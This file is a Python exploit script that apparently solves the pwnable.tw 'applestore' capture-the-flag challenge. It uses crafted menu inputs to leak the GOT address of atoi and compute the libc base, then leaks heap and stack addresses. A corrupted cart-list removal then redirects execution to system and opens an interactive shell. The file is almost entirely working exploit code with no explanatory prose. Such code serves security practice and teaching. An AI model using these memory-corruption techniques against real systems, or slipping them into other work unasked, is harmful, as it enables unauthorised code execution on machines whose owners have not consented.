#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./applestore')
libc = ELF('/home/arjun/github/pwnabletw/applesort/libc.so.6')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10104)

gdbscript = '''
b *0x08048A1B
b *0x08048A2A
b *0x8048a70
tbreak main
set disable-randomization off
continue
'''.format(**locals())

def choice(option):
    sla(b"> ", option)

def add(num):
    choice(2)
    choice(num)

def remove(num):
    choice(3)
    choice(num)

def checkout():
    choice(5)
    choice('y')

def fake(payload):
    choice(4)

x=0
io = start()

for i in range(19):
    add(1)

for i in range(6):
    add(3)

add(4)
checkout()

choice(4)
choice(b"y\x00" + p(exe.got.atoi) + p(0x1337) + p(0) + p(0))

reu(b"27: ")
libc.address = uuu64(ren(4))-libc.sym.atoi

lb()

choice(4)
choice(b"y\x00" + p(0x804b070) + p(0x1337) + p(libc.sym.__malloc_hook) + p(libc.sym.__malloc_hook))
reu(b"27: ")

heap_base = uuu64(ren(4))-0x410
hb()


choice(4)
choice(b"y\x00" + p(heap_base+0x7f0) + p(0x1337) + p(libc.sym.__malloc_hook) + p(libc.sym.__malloc_hook))
reu(b"27: ")
stack_leak = uuu64(ren(4))-0x410
print(hex(stack_leak))
sleep(1)
choice(3)
choice(b"27" + p(libc.sym.system) + p(0xdeadbeef) + p((stack_leak+0x460+8-0xc)-0xc) + p((stack_leak+0x430)-0x8))
choice(b"6\x00Aaaa" + p(libc.sym.system) + p(0x804b080) + p(libc.address+0x158e8b))
io.interactive()

"""
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cartx
4: List your shopping cart
5: Checkout
6: Exit
> 
=== Device List ===
1: iPhone 6 - $199
2: iPhone 6 Plus - $299
3: iPad Air 2 - $499
4: iPad Mini 3 - $399
5: iPod Touch - $199
> 
"""